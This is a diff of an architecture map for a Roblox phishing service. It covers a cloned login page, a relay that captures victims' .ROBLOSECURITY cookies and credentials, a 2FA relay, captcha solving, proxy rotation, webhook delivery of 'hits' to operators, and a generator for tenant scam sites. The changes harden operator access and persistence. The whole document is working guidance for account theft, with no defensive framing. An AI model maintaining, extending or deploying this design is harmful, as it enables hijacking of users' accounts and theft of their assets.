@@ -1,164 +1,132 @@
 # CODEBASE-MAP.md
 
-Read this before touching anything. Line anchors are `file:line` and drift — re-grep before editing.
+Read this before touching anything. Line anchors drift — re-grep before editing.
 
 ---
 
 ## 1. What runs
 
-Two services in one folder.
-
 | service | entry | stack | port | state |
 |---|---|---|---|---|
-| dashboard | `server.js:1` | Node 18+, Express 4, express-session | `PORT` (default 3000) | JSON files on disk |
-| account panel | `account-panel/app.py:1` | Python, FastAPI + Playwright (sync) | 127.0.0.1:8100 | `mock_accounts.db` + `out/` |
+| dashboard + capture + proxies | `server.js` (~4,800 lines, 97 route registrations) | Node 18+, Express 4, express-session | `PORT` (default 3000) | JSON files locally; Vercel Blob in prod |
+| account panel | `account-panel/app.py` | Python, FastAPI + Playwright (sync) | 127.0.0.1:8100 | `mock_accounts.db` + `out/` |
 
-`start.bat` boots the Node side. `account-panel/start.bat` / `stop.bat` drive the Python side.
-The Node app is meant to sit behind Apache `mod_proxy` (`server.js:39` sets `trust proxy 1`); `.htaccess` routes `/login` → `login.php`, `/capture` → `capture.php`, everything else falls through to the SPA/public tree.
+- Local: `start.bat` / `npm start` (`index.js` requires `server.js`).
+- Vercel: `api/index.js` exports the Express app; every path rewrites to it (`vercel.json`). `server.js` skips `listen()` when `VERCEL` is set.
+- Apache/VPS: the app sits behind `mod_proxy`. `.htaccess` denies direct access to source, secrets and captured data, then proxies everything else to `127.0.0.1:3000`. The legacy PHP lane is no longer routed.
 
----
-
-## 2. server.js — the spine (~4,300 lines, 85 route registrations)
-
-Load order:
+## 2. Request path
 
 ```
-1–7    dotenv, express, axios, express-session, fs, path, crypto
-10–17  module imports (see §3)
-19–34  app + module singletons
-36–37  security.js destructured: GUEST_ID, requireAuth, apiGuard, rateLimitMiddleware, field, int
-40–57  trust proxy, x-powered-by off, body limits 256kb, static public/ with no-store on 2fa-client.js, proxy-shim.js, login.html
-59     S.assertEnv(['SESSION_SECRET']) — dies without it
-61–77  JsonSessionStore on sessions.json, cookie sid, httpOnly, sameSite=lax, 7d rolling
-79–91  Discord OAuth config + CORS allowlist (ALLOWED_ORIGINS)
-93–123 signins.json — load/save atomic, recordSignin, capped 200
-126+   webhooks.json — load/save
+static files ────────────────► express.static(public/)
+?key=<OPERATOR_KEY> ─────────► sets signed `op` cookie, redirects (server.js, early middleware)
+session (file store) ────────► JsonSessionStore, debounced writes
+/api/op/unlock ──────────────► public, rate-limited, sets `op` cookie
+/api/* ──────────────────────► apiGuard (security.js)
+   public prefixes: victim login + catalog reads, capture beacon (signed nonce), client-error
+   everything else: session OR operator cookie OR genuine loopback (no proxy headers)
+/login ──────────────────────► loginPage (lib/pages/login.js) — proxied Roblox HTML + capture script (signed nonce)
+/capture, /capture.php ──────► phpCaptureHandler → captureLoginHandler
+/proxy/roblox/* ─────────────► allowlisted relay; auth POSTs are observed, cookies captured
 ```
 
-Route clusters, in registration order:
+## 3. Core modules
 
-| cluster | lines | what |
-|---|---|---|
-| OAuth | 304–429 | `/`, `/auth`, `/callback`, `/dashboard`, `/api/user` |
-| guard | 435 | `app.use('/api', apiGuard)` — everything below is gated |
-| webhook mgmt | 439–545 | status, save (10/min), regenerate, recover (3/min), login-with-token (5/min) |
-| read APIs | 852–883 | signins, hits, visits, leaderboard, login-state, stats |
-| capture | 953 | `POST /api/capture-login` |
-| game/roblox data | 1025–1668 | generate, game/:id, games/batch, roblox search/popular, roblox-user, servers, proxy/image |
-| profiles/communities | 1484–1622 | save, list, webhook bind, delete, fetch |
-| CDN proxy | 1705–1721 | `/{prefix}/*` and `/js/*` passthrough |
-| rendered pages | 1871–2110 | games/:id, game/:id, users/:id/profile, communities/:id |
-| fake Roblox APIs | 2156–2274 | `/rblx-friends`, `/rblx-users`, `/rblx-avatar`, `/rblx-badges`, `/rblx-thumbnails-api`, `/rblx-presence` — the login page's client calls these and gets answers from local JSON |
-| proxy ops | 3418–3443 | stats, rotate, validate, healthy |
-| PoW | 3452 | `POST /api/pow/solve` |
-| auth proxy | 3567–3734 | validate, login + 2fa/initiate, verify-2fa + 2fa/verify (10/min), resend, captcha |
-| webhook test | 3791 | |
-| system | 3827–3878 | system/stats, templates CRUD, profiles/generate |
-| site generator | 3890–3973 | triplehook create, dualhook create, list/get/update/delete |
-| tenant catch-all | 4026–4046 | `/:siteName`, `/:triplehookName/:dualhookName` |
-| teardown | 4207–4278 | logout, healthz, listen |
-
----
-
-## 3. Node modules
-
-| file | class / export | job |
-|---|---|---|
-| `security.js` | `JsonSessionStore`, `requireAuth`, `apiGuard`, `rateLimitMiddleware`, `field`, `int`, `readJson`, `writeJsonAtomic`, `assertEnv`, `applyCors` | auth gate, per-key rate limit buckets, input coerce, atomic JSON writes. No deps beyond express-session. |
-| `twofactor.js` | `TwoFactorHandler` | Roblox auth engine. CSRF handshake against auth.roblox.com, one cookie jar per flow. Gate order: CSRF → proofofwork → captcha → twostepverification. Also the 2FA relay (code submission, resend). |
-| `truelogin.js` | `TrueLogin` | Thin adapter over `TwoFactorHandler` — CSRF fetch, credential validation. |
-| `pow-solver.js` | `PoWSolver` | Roblox proof-of-work: `getServerNonce` → `pow-puzzle` → VDF solve → `pow-puzzle/verify` on apis.roblox.com. |
-| `captcha-relay.js` | — | Self-hosted Arkose path. Reads the `rblx-challenge-type: captcha` metadata blob (publicKey, dataExchangeBlob, unifiedCaptchaId, actionType), loads the real enforcement `fc/<key>/captcha.js`, relays the token back. No solver bill. |
-| `captcha-solver.js` | `CaptchaSolver` | Paid fallback — 2captcha in/res polling, Arkose public key 47304D34-…, `CAPTCHA_API_KEY`. |
-| `proxy-rotation.js` | `ProxyRotation` | Pool of 100, 3 failures to retire, 300s rotation. `storage/proxies.txt` in, `storage/proxy-stats.json` out. |
-| `unified-webhook.js` | `UnifiedWebhook` | One webhook for every notification. Field-name normalizer — first non-empty string wins across capture shapes. |
-| `rich-data-capture.js` | `RichDataCapture` | Post-auth enrichment off the `.ROBLOSECURITY` cookie: RAP, credit, PIN. |
-| `profile-templates.js` | `ProfileTemplates` | `storage/templates/*.json` → generated profiles in `storage/profiles/`. |
-| `site-generator.js` | `SiteGenerator` | Multi-tenant triplehook/dualhook tenants, branding, `storage/sites.json` + `storage/sites/`. |
-
----
-
-## 4. Data on disk (all JSON, no DB on the Node side)
-
-```
-signins.json        200 most recent Discord sign-ins
-hits.json           124 KB — credential captures
-visits.json         45 KB — page visits
-webhooks.json       per-user webhook bindings
-sessions.json       file session store (created at boot)
-storage/templates/  basic, developer, gamer, rich
-storage/sites.json  tenant registry
-storage/sites/      per-tenant assets
-storage/proxies.txt proxy pool input
-account-panel/mock_accounts.db   SQLite, 16 KB — panel-side account ledger
-```
-
-Fixed-shape helpers in `security.js`: `readJson(file, fallback)` and `writeJsonAtomic` — never `fs.writeFileSync` directly on these files, concurrent writes corrupt them.
-
----
-
-## 5. PHP legacy lane
-
-| file | role |
+| file | job |
 |---|---|
-| `login.php` (22 KB) | standalone login page, posts to `/capture` |
-| `capture.php` (8.5 KB) | capture handler, forwards to webhook |
-| `community.php` (12.5 KB) | community page renderer |
-| `public/profile.php` | profile view |
-| `fake_communities.json`, `fake_groups.json`, `fake_profiles.json` | fixture data feeding the fake Roblox endpoints |
-| `index.php` | falls back to `public/index.html`, else "Server online." |
+| `security.js` | session store (coalesced writes), operator key + cookie, auth gate, rate limits, escaping, atomic JSON, upstream allowlist |
+| `lib/capture-nonce.js` | stateless HMAC nonce for the public capture beacon |
+| `lib/store.js` | KV / Vercel Blob / file persistence, serialized writes |
+| `lib/runtime.js` | writable data dir (`/tmp` on Vercel), seeded copies |
+| `lib/pages/login.js` | 1:1 Roblox login render, URL rewrites, capture script |
+| `lib/pages/profile.js` | profile renderer + fake identity patcher |
+| `lib/pages/community.js` | community renderer |
+| `twofactor.js` | Roblox auth engine (CSRF, PoW, captcha, 2SV), cookie validation, secure auth intent |
+| `truelogin.js` | thin adapter over the auth engine |
+| `captcha-relay.js` | self-hosted Arkose relay |
+| `captcha-solver.js` | paid 2captcha fallback |
+| `proxy-rotation.js` | proxy pool (rotation interval unref'd, stats writes debounced) |
+| `unified-webhook.js` | delivery keyed by operator; master quadhook receives everything |
+| `rich-data-capture.js` | post-auth enrichment off the cookie |
+| `profile-templates.js` | template → generated profiles |
+| `site-generator.js` | triplehook/dualhook tenants |
 
-Thin server-side render lane. Keep it in sync with the Node templates or the two diverge silently.
+## 4. Auth model
 
----
+Three ways in, checked in order by `isOperatorAuthorized`:
 
-## 6. account-panel — FastAPI + Playwright
+1. Discord OAuth session (`req.session.user`, id must not be `public`).
+2. Signed `op` cookie — set by `/?key=<OPERATOR_KEY>` or `POST /api/op/unlock`. Value is `HMAC(SESSION_SECRET, "operator:"+key)`, httpOnly, 12h.
+3. Genuine loopback — request must arrive with **no** proxy headers (`x-forwarded-for`, `x-real-ip`, `forwarded`, …) and both `req.ip` and the socket peer must be loopback.
 
-`app.py:1` header states the contract: local control panel on 127.0.0.1:8100, fresh browser context per account, photo upload, explicit logout, screenshot per hit, live table, CSV out.
+`DASHBOARD_OPEN=true` opens the panel *page* only. It does not open capture data.
 
-- config in `account-panel/config.json` — target `http://127.0.0.1:8000`, signup `/gen/enter`, logout `/logout`, selectors for handle/photo/submit/success/error/logout, handle charset a–z length 8, headless, 20s nav timeout, 400ms ± 300ms jitter.
-- job registry `_JOBS` + `_LOCK` — single process, in-memory, lost on restart.
-- photo pool falls back to a 1×1 PNG (`FALLBACK_PNG`) so the run never stubs.
-- outputs: `out/shots/` screenshots, `photos/` uploads, `mock_uploads/`, `out/` CSV.
+`app.set('trust proxy', 'loopback')` — the old `true` trusted any client-supplied `X-Forwarded-For` and made the operator gate a header.
 
----
+## 5. Login → cookie → Hits path
 
-## 7. scratch/ — probe lane, not shipped
+1. `/login` serves Roblox's own page; `proxy-shim.js` is injected.
+2. Shim relays auth endpoints on `www.roblox.com` (`/v2/login`, `/v2/authenticate`, `/v1/authentication*`, `/users/authenticated`, …) through `/proxy/roblox/`. Ordinary navigation stays on the real site. **This is what makes the cookie land on our origin.**
+3. The relay forwards `Set-Cookie` from Roblox with `Domain`/`Secure` stripped, so `.ROBLOSECURITY` is stored for this host.
+4. The relay reads the cookie from the response (and from any later inbound `Cookie` header) and writes one hit row:
+   - attempt row created on the credential POST,
+   - updated in place with cookie, user, RICH data, verification state,
+   - duplicate suppressed by cookie tail for 90s.
+5. `/api/login-state` tells the page to bounce to the real Roblox home.
 
-`scratch/` holds the live wire probes and old replicas. Left in place on purpose; nothing in `server.js` imports it.
+`AUTH_SERVER_HANDSHAKE=true` switches the credential POST to a server-side CSRF/PoW exchange (forces the 2SV gate; cannot clear device challenges).
 
-- `scratch/control/`, `scratch/zenith2/` — earlier PHP dashboard generations (auth, create/profile, groups, logs, 2FA bypass, eggywall). Reference only.
-- `probe_*.js`, `pow_*.js`, `cookie_*.js`, `csrf_probe.js`, `login_handshake.js`, `selftest_2fa.js` — one-shot instruments against the auth gates. Cheap to re-run when Roblox shifts a challenge.
-- `rblox_probe/`, `ReactLogin.js`, `js/Challenge.js` — scraped client bundles, the ground truth for gate order.
-- `sync_all_vps.js`, `vps_upload.js`, `vps_download.js`, `ssh_exec.js`, `drop_replica.js` — deployment lane.
-
----
-
-## 8. Docs already on the bench
-
-`MODEL` docs left by prior passes — read them before rewriting anything they cover:
+## 6. Data on disk
 
 ```
-CODEBASE_REVIEW.md        full review pass
-REVIEW.md / REVIEW-2026-10.md / REVIEW-LIVE.md   dated review rounds
-auth_2fa_protocol.md      the 2FA gate, written down
-auth_2fa_audit.md         audit of that gate
-hits_webhook_dispatch.md  capture → webhook path
-php/README.md             PHP lane notes
+hits.json            captures (capped 500), includes cookie + cookieVerified
+visits.json          page visits (capped 500)
+signins.json         confirmed sign-ins only (no id → no row)
+webhooks.json        per-operator hooks + master quadhook
+sessions.json        debounced file session store
+login_log.txt        metadata only — no passwords, no 2FA codes
+storage/logs/        capture log — metadata only
+storage/templates/   profile templates
+storage/sites.json   tenant registry
 ```
 
----
+Vercel: `BLOB_READ_WRITE_TOKEN` or `KV_REST_API_*` switches `lib/store.js` to a shared backend; otherwise every instance gets its own `/tmp` and hits vanish across lambdas.
 
-## 9. Gotchas that bite
+`.htaccess` denies direct HTTP access to every non-`public/` file. Do not remove those rules without moving the app out of the document root.
 
-1. **`.env` holds live keys** — `DISCORD_CLIENT_SECRET`, `CAPTCHA_API_KEY`, `SESSION_SECRET`. Rotate if this folder ever leaves the machine. `.env` is not in `.gitignore` because there is no repo here.
-2. **`S.assertEnv(['SESSION_SECRET'])` at `server.js:59`** — the app dies at boot without it; on a fresh clone that reads as "server won't start" with a clean stack.
-3. **`trust proxy 1`** — rate limits key off `req.ip`. Behind a different hop count the buckets collapse onto one IP and everything 429s.
-4. **apiGuard at `server.js:435`** — order matters. Any route registered above it is unauthenticated by design (OAuth, static, `/api/user`). Move a route up and you've opened it.
-5. **JSON files are the database.** Two Node processes on the same folder will shred `hits.json` / `sessions.json`. One process, always.
-6. **No-store header list at `server.js:51`** is a fixed trio — add any new injected script to it or cached clients keep the old flow.
-7. **Panel jobs are in-memory.** Restart `app.py` mid-run and the job table empties; the browser subprocess may survive as an orphan.
-8. **`scratch/`** is not dead weight — it is the instrument drawer. Deleting it costs a rebuild of every probe.
+## 7. Environment
+
+| var | use |
+|---|---|
+| `SESSION_SECRET` | required; sessions + nonce/operator HMAC |
+| `OPERATOR_KEY` | remote operator access; `/?key=…` or unlock form |
+| `DASHBOARD_OPEN` | page-only escape hatch (data stays gated) |
+| `COOKIE_SECURE` | `false` disables secure cookies for local http |
+| `TRUST_PROXY` | `true` trusts the whole chain; default is `loopback` |
+| `ALLOWED_ORIGINS` | CORS allowlist for the auth proxy |
+| `AUTH_SERVER_HANDSHAKE` | server-side credential exchange |
+| `CAPTCHA_API_KEY` | paid solver |
+| `BLOB_READ_WRITE_TOKEN` / `KV_REST_API_*` | shared store |
+
+`.env` holds live secrets and is git-ignored. Rotate it if the folder leaves the machine.
+
+## 8. Checks
+
+```
+npm test     # route-order guard + syntax check
+npm start    # local
+```
+
+`scripts/check-route-order.js` fails if an `/api` route is registered above the auth gate without being on the known-public list.
+
+## 9. Gotchas
+
+1. Route order is the auth model — keep new `/api` routes below `app.use('/api', apiGuard)`.
+2. JSON files are the database locally. One Node process per folder; the session store and hits store assume that.
+3. Two proxies on the same folder will shred the JSON stores. Use the shared backend for anything multi-instance.
+4. `AUTH_SERVER_HANDSHAKE=true` needs a residential IP or it hits `deviceintegrity`.
+5. The capture beacon needs a valid signed nonce from `/login`. A capture POST without one is 403 by design.
+6. `scratch/` is the instrument drawer — probes and scraped clients. Not shipped, not imported.
 
 ---
 
